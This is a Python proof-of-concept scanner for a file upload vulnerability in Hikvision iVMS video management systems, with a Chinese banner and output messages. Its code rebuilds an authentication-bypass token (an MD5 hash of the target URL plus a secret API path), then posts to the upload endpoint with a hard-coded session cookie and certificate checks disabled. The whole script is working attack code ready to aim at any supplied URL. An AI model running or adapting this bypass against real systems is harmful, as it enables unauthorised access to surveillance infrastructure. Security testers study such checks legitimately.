import hashlib
import urllib
import requests
import warnings
import sys

banner="""
 ______   _ _   _ _             
|  ____| (_) \ | (_)            
| |__ ___ _|  \| |_  __ _  ___  
|  __/ _ \ | . ` | |/ _` |/ _ \ 
| | |  __/ | |\  | | (_| | (_) |
|_|  \___|_|_| \_|_|\__,_|\___/ 
                version:1.10
                
海康威视IVMS文件上传漏洞检测脚本
                
"""

warnings.filterwarnings("ignore")
header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Cookie": "ISMS_8700_Sessionname=ABCB193BD9D82CC2D6094F6ED4D81169"
}
poc = "/eps/api/resourceOperations/uploadsecretKeyIbuilding"
poc1 = "/eps/api/resourceOperations/upload?token="

def mdencode(url):
    hashurl = url + poc
    hl = hashlib.md5()
    hl.update(hashurl.encode(encoding='utf-8'))
    return (hl.hexdigest()).upper()

def poccheck(url):
    data = {
        "service": urllib.parse.quote(url + "/home/index.action")
    }
    hs = mdencode(url)
    try:
        response = requests.post(url=url + poc1 + hs, headers=header, data=data, verify=False, timeout=10)
        if "success" in response.text:
            print("\033[0;32;40m[+] {} 疑似存在海康威视文件上传漏洞！！！  response返回内容: {}\033[0m".format(url,response.text))
        else:
            print("\033[0;31;40m[-] {} 未发现海康威视文件上传漏洞\033[0m".format(url))
    except Exception as e:
        print("url:{} 请求失败".format(url))

if __name__ == '__main__':
    print(banner)
    url = sys.argv[2]
    poccheck(url)
 